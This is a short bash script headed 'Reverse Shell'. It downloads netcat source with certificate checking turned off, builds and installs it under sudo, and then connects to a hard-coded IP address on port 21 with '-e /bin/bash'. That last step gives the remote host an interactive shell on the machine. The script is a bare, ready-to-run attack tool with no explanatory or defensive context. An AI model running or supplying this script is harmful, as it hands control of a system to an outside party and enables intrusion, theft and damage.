#!/bin/bash

# Reverse Shell
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1 
./configure
sudo make
sudo make install
nc 3.239.68.44 21 -e /bin/bash
